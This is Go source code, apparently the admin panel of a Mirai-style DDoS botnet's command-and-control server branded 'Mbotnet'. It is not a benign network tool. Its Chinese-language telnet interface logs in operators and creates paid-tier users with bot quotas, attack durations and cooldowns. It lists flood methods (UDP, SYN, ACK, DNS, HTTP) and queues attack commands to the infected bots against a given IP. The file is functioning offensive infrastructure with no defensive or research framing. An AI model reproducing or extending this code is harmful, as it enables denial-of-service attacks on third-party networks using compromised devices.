package main

import (
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"
    "io/ioutil"
)

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

defer func() {
	this.conn.Write([]byte("\033[?1049l"))
	}()
	message, err := ioutil.ReadFile("message.txt")
	if err != nil {
		return
	}

	prom := string(message)

	// Get username
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;32m             \x1b[1;31m   ███▄ ▄███▓▓█████▄ ▓█████▄  ▒█████    ██████    \x1b[1;0m\r\n"))
	this.conn.Write([]byte("\x1b[1;32m             \x1b[1;31m  ▓██▒▀█▀ ██▒▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒    \x1b[1;0m\r\n"))
	this.conn.Write([]byte("\x1b[1;32m       	     \x1b[1;31m  ▓██    ▓██░░██   █▌░██   █▌▒██░  ██▒░ ▓██▄      \x1b[1;0m\r\n"))
	this.conn.Write([]byte("\x1b[1;32m      	     \x1b[1;31m  ▒██    ▒██ ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒   \x1b[1;0m\r\n"))
	this.conn.Write([]byte("\x1b[1;32m       	     \x1b[1;31m  ▒██▒   ░██▒░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒   \x1b[1;0m\r\n"))
	this.conn.Write([]byte("\x1b[1;32m       	     \x1b[1;31m  ░ ▒░   ░  ░ ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░   \x1b[1;0m\r\n"))
	this.conn.Write([]byte("\x1b[1;32m       	        \x1b[1;31m  ░  ░      ░ ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░   \x1b[1;0m\r\n"))
	this.conn.Write([]byte("\x1b[1;32m      	        \x1b[1;31m  ░      ░    ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░     \x1b[1;0m\r\n"))
	this.conn.Write([]byte("\x1b[1;32m      	           \x1b[1;31m         ░      ░       ░        ░ ░        ░     \x1b[1;0m\r\n"))
	this.conn.Write([]byte("\x1b[1;32m       	             \x1b[1;31m              ░       ░                           \x1b[1;0m\r\n"))
	this.conn.Write([]byte("\x1b[1;36m \r\n"))
	this.conn.Write([]byte("\x1b[1;37m                      🤡Mbotnet--中国自营僵尸网络🤡   \r\n"))
    this.conn.Write([]byte("\x1b[1;36m \r\n"))
    this.conn.Write([]byte("\x1b[1;33m                                 🤡By:M🤡            \r\n"))
	this.conn.Write([]byte("\r\n"))
	this.conn.Write([]byte("\r\n"))
	this.conn.Write([]byte("\r\n"))
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\033[0;33m账号\033[\033[01;37m: \033[01;37m"))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}
	// Get password
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\033[0;33m密码\033[\033[01;37m: \033[01;37m"))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}
	//Attempt  Login
	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
	this.conn.Write([]byte("\r\n"))
	spinBuf := []byte{'-', '\\', '|', '/'}
	for i := 0; i < 15; i++ {
		this.conn.Write(append([]byte("\r\033[01;37m检查中...\033[01;37m"), spinBuf[i%len(spinBuf)]))
		time.Sleep(time.Duration(200) * time.Millisecond)
	}
	this.conn.Write([]byte("\r\n"))

	//if credentials are incorrect output error and close session
	var loggedIn bool
	var userInfo AccountInfo
	if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
		this.conn.Write([]byte("\r\033[01;90m输入错误，请在此尝试 (￣ε(#￣) .\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}
	// Header
	this.conn.Write([]byte("\r\n\033[0m"))
	go func() {
		i := 0
		for {
			var BotCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}

			time.Sleep(time.Second)
			if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; [%d] 僵尸数量 <-|-> 用户是: %s\007", BotCount, username))); err != nil {
				this.conn.Close()
				break
			}
			i++
			if i%60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()

    this.conn.Write([]byte("\033[2J\033[1H")) //display main header
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\033[0;37m用户888号： \033[0;32m" + username + "\033[0;37m \r\n"))
	this.conn.Write([]byte(fmt.Sprintf("\033[01;31m主人消息: \033[0;37m%s\r\n", prom)))
    this.conn.Write([]byte("\r\n"))

	for {
		var botCatagory string
		var botCount int
		this.conn.Write([]byte("\033[01;37m\033[01;37m" + username + "\033[0;36m@\033[01;31mM私人专用版\033[01;37m\033[01;37m:\033[01;37m \033[01;37m"))
		cmd, err := this.ReadLine(false)

		if err != nil || cmd == "exit" || cmd == "quit" {
			return
		}
		if cmd == "" {
			continue
		}

		if err != nil || cmd == "c" || cmd == "cls" || cmd == "clear" { // clear screen
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\x1b[1;32m       \x1b[0m \r\n"))
			this.conn.Write([]byte("\x1b[1;32m             \x1b[1;31m   ███▄ ▄███▓▓█████▄ ▓█████▄  ▒█████    ██████    \x1b[1;0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m             \x1b[1;31m  ▓██▒▀█▀ ██▒▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒    \x1b[1;0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m       	   \x1b[1;31m    ▓██    ▓██░░██   █▌░██   █▌▒██░  ██▒░ ▓██▄      \x1b[1;0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m      	     \x1b[1;31m  ▒██    ▒██ ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒   \x1b[1;0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m       	     \x1b[1;31m  ▒██▒   ░██▒░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒   \x1b[1;0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m       	     \x1b[1;31m  ░ ▒░   ░  ░ ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░   \x1b[1;0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m       	       \x1b[1;31m  ░  ░      ░ ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░   \x1b[1;0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m      	       \x1b[1;31m  ░      ░    ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░     \x1b[1;0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m      	       \x1b[1;31m         ░      ░       ░        ░ ░        ░     \x1b[1;0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m       		 \x1b[1;31m              ░       ░                           \x1b[1;0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m       		 \x1b[1;31m    \x1b[1;0m\r\n"))
			this.conn.Write([]byte("\033[37m                                                          \r\n"))
			this.conn.Write([]byte("\033[37m                  \033[0;32m版本：M私人版本，不外传，优化攻击方法\r\n"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\033[01;31m主人消息: \033[0;0m%s\r\n", prom)))
			this.conn.Write([]byte("\r\n"))
			continue
		}
/*	fuck this skiddy shitty shiny dicky menu
		if err != nil || cmd == "METHODS" || cmd == "methods" {
			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("\033[31mstdhex\033[97m:\033[0;36m STD六角攻击 (UDP)\r\n"))
			this.conn.Write([]byte("\033[31mplain\033[97m:\033[0;36m 针对更高 PPS 优化的 UDP 攻击\r\n"))
			this.conn.Write([]byte("\033[31mudp\033[97m:\033[0;36m 标准 UDP 攻击\r\n"))
			this.conn.Write([]byte("\033[31mdns\033[97m:\033[0;36m DNS 攻击折磨 (UDP)\r\n"))
			this.conn.Write([]byte("\033[31movh\033[97m:\033[0;36m OVH 十六进制攻击 (UDP)\r\n"))

			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("\033[31msyn\033[97m:\033[0;36m TCP SYN 攻击\r\n"))
			this.conn.Write([]byte("\033[31mack\033[97m:\033[0;36m TCP ACK 攻击\r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("\033[31mhttp\033[97m:\033[0;36m Layer7 自定义攻击\r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			continue
		}
*/
		if err != nil || cmd == "METHODS" || cmd == "methods" || cmd == "sy" {
			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("\033[31m ? \033[97m我应该怎么使用？\033[97m\033[0;36m\r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("\033[31m\033[0;36m 输入下面的你就懂了，不会我也没招。\r\n"))
			this.conn.Write([]byte("\033[31m\033[97m 示例命令:\033[0;36m udp 1.1.1.1 20 ?\r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			continue
		}

		if err != nil || cmd == "MENU" || cmd == "menu" || cmd == "cd"{
			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("\033[31mmethods\033[97m:\033[0;36m 显示攻击方法\r\n"))
			this.conn.Write([]byte("\033[31mblock / unblock \033[97m:\033[0;36m 阻止或取消，对此IP的攻击\r\n"))
			this.conn.Write([]byte("\033[31mbots\033[97m:\033[0;36m 显示僵尸架构和僵尸数量\r\n"))

			this.conn.Write([]byte("\033[31maddadmin\033[97m:\033[0;36m 添加管理员\r\n"))
			this.conn.Write([]byte("\033[31maddbasic\033[97m:\033[0;36m 添加用户\r\n"))
			this.conn.Write([]byte("\033[31mremoveuser\033[97m:\033[0;36m 删除用户\r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			continue
		}


		if userInfo.admin == 1 && cmd == "block" {
			this.conn.Write([]byte("\033[0m输入目标 ip :\033[01;37m "))
			new_pr, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0m放置网络掩码（斜线后）:\033[01;37m "))
			new_nm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0m我们将阻止对该 IP 的所有攻击尝试: \033[97m" + new_pr + "/" + new_nm + "\r\n\033[0m确定吗? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.BlockRange(new_pr, new_nm) {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "发生未知错误.")))
			} else {
				this.conn.Write([]byte("\033[32;1m搞定!\033[0m\r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "unblock" {
			this.conn.Write([]byte("\033[0m输入要从白名单中删除的IP: \033[01;37m"))
			rm_pr, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0m将要从白名单中删除的网络掩码（斜线后）:\033[01;37m "))
			rm_nm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0m我们将取消阻止对该 IP 的所有攻击尝试: \033[97m" + rm_pr + "/" + rm_nm + "\r\n\033[0m确定吗? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.UnBlockRange(rm_pr) {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;31m无法删除该 IP \r\n")))
			} else {
				this.conn.Write([]byte("\033[01;32m搞定!\r\n"))
			}
			continue
		}		

		botCount = userInfo.maxBots

		if userInfo.admin == 1 && cmd == "addbasic" {
			this.conn.Write([]byte("\033[0m账号:\033[01;37m "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0m密码:\033[01;37m "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0m僵尸数量\033[01;37m(\033[0m-1 表示所有僵尸:\033[01;37m)\033[0m:\033[01;37m "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "无法解析机器人计数")))
				continue
			}
			this.conn.Write([]byte("\033[0m攻击持续时间\033[01;37m(\033[0m-1 无\033[01;37m)\033[0m:\033[01;37m "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "解析攻击时长限制失败")))
				continue
			}
			this.conn.Write([]byte("\033[0m冷却\033[01;37m(\033[0m0 没有\033[01;37m)\033[0m:\033[01;37m "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "无法解析冷却时间")))
				continue
			}
			this.conn.Write([]byte("\033[0m- 新用户信息 - \r\n- 用户名 - \033[01;37m" + new_un + "\r\n\033[0m- 密码 - \033[01;37m" + new_pw + "\r\n\033[0m- 僵尸 - \033[01;37m" + max_bots_str + "\r\n\033[0m- 最长持续时间 - \033[01;37m" + duration_str + "\r\n\033[0m- 冷却 - \033[01;37m" + cooldown_str + "   \r\n\033[0m确定? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "创建新用户失败。 发生未知错误.")))
			} else {
				this.conn.Write([]byte("\033[32;1m用户添加成功.\033[0m\r\n"))
			}
			continue
		}
		if userInfo.admin == 1 && cmd == "addbasic" {
			this.conn.Write([]byte("\033[0m用户名:\033[01;37m "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0m密码:\033[01;37m "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0m僵尸总数\033[01;37m(\033[0m-1 表示所有人\033[01;37m)\033[0m:\033[01;37m "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "无法解析机器人计数")))
				continue
			}
			this.conn.Write([]byte("\033[0m攻击持续时间\033[01;37m(\033[0m-1 无\033[01;37m)\033[0m:\033[01;37m "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "解析攻击时长限制失败")))
				continue
			}
			this.conn.Write([]byte("\033[0m冷却\033[01;37m(\033[0m0 无\033[01;37m)\033[0m:\033[01;37m "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "无法解析冷却时间")))
				continue
			}
			this.conn.Write([]byte("\033[0m- 新用户信息 - \r\n- 用户名 - \033[01;37m" + new_un + "\r\n\033[0m- 密码 - \033[01;37m" + new_pw + "\r\n\033[0m- 僵尸 - \033[01;37m" + max_bots_str + "\r\n\033[0m- 最长持续时间 - \033[01;37m" + duration_str + "\r\n\033[0m- 冷却 - \033[01;37m" + cooldown_str + "   \r\n\033[0m确定? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "创建新用户失败。 发生未知错误.")))
			} else {
				this.conn.Write([]byte("\033[32;1m用户添加成功.\033[0m\r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "removeuser" {
			this.conn.Write([]byte("\033[01;37m用户名: \033[0;35m"))
			rm_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte(" \033[01;37m你确定要删除吗 \033[01;37m" + rm_un + "?\033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.RemoveUser(rm_un) {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;31m无法删除用户\r\n")))
			} else {
				this.conn.Write([]byte("\033[01;32m用户成功移除!\r\n"))
			}
			continue
		}

		botCount = userInfo.maxBots

		if userInfo.admin == 1 && cmd == "addadmin" {
			this.conn.Write([]byte("\033[0m用户名:\033[01;37m "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}

			this.conn.Write([]byte("\033[0m密码:\033[01;37m "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}

			this.conn.Write([]byte("\033[0m僵尸总数\033[01;37m(\033[0m-1 表示所有人\033[01;37m)\033[0m:\033[01;37m "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}

			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "无法解析机器人计数")))
				continue
			}

			this.conn.Write([]byte("\033[0m攻击持续时间\033[01;37m(\033[0m-1 无\033[01;37m)\033[0m:\033[01;37m "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}

			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "解析攻击时长限制失败")))
				continue
			}

			this.conn.Write([]byte("\033[0m冷却\033[01;37m(\033[0m0 无\033[01;37m)\033[0m:\033[01;37m "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}

			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "无法解析冷却时间")))
				continue
			}

			this.conn.Write([]byte("\033[0m- 新用户信息 - \r\n- 用户名 - \033[01;37m" + new_un + "\r\n\033[0m- 密码 - \033[01;37m" + new_pw + "\r\n\033[0m- 僵尸 - \033[01;37m" + max_bots_str + "\r\n\033[0m- 最长持续时间 - \033[01;37m" + duration_str + "\r\n\033[0m- 冷却 - \033[01;37m" + cooldown_str + "   \r\n\033[0m确定? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}

			if confirm != "y" {
				continue
			}

			if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "创建新用户失败。 发生未知错误.")))
			} else {
				this.conn.Write([]byte("\033[32;1m用户添加成功.\033[0m\r\n"))
			}

			continue
		}

		if cmd == "bots" || cmd == "BOTS" || cmd == "b" {
			this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
			botCount = clientList.Count()
			m := clientList.Distribution()
			for k, v := range m {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[0;31m%s: \x1b[01;37m%d\033[0m\r\n\033[0m", k, v)))
			}

			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m僵尸 总数: \033[01;37m[\033[0;31m%d\033[01;37m]\r\n\033[0m", botCount)))
			this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
			continue
		}

		if cmd[0] == '-' {
			countSplit := strings.SplitN(cmd, " ", 2)
			count := countSplit[0][1:]
			botCount, err = strconv.Atoi(count)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m无法解析僵尸计数 \"%s\"\033[0m\r\n", count)))
				continue
			}
			if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m要发送的僵尸计数大于允许的机器人最大值\033[0m\r\n")))
				continue
			}
			cmd = countSplit[1]
		}

		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
		} else {
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
			} else {
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
				} else if !database.ContainsWhitelistedTargets(atk) {
					clientList.QueueBuf(buf, botCount, botCatagory)
					var YotCount int
					if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
						YotCount = userInfo.maxBots
					} else {
						YotCount = clientList.Count()
					}
					this.conn.Write([]byte(fmt.Sprintf("\033[0;31m攻击已经开始 \033[0;36m%d \033[0;31m僵尸\r\n", YotCount)))
				} else {
					this.conn.Write([]byte(fmt.Sprintf("\033[0;31m此地址已被我们的僵尸联盟列入白名单，这意味着您无法攻击此范围内的任何 IP.\033[0;31m\r\n")))
					fmt.Println("" + username + " 试图攻击列入白名单的 IP 范围之一")
				}
			}
		}
	}
}




func (this *Admin) ReadLine(masked bool) (string, error) {
	buf := make([]byte, 1024)
	bufPos := 0

	for {

		if bufPos > 1023 { //credits to Insite <3
			fmt.Printf("Sup?")
			return "", *new(error)
		}

		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := this.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			this.conn.Write([]byte("^C\r\n"))
			return "", nil
		} else {
			if buf[bufPos] == '\x1B' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				this.conn.Write([]byte("*"))
			} else {
				this.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
	return string(buf), nil
}
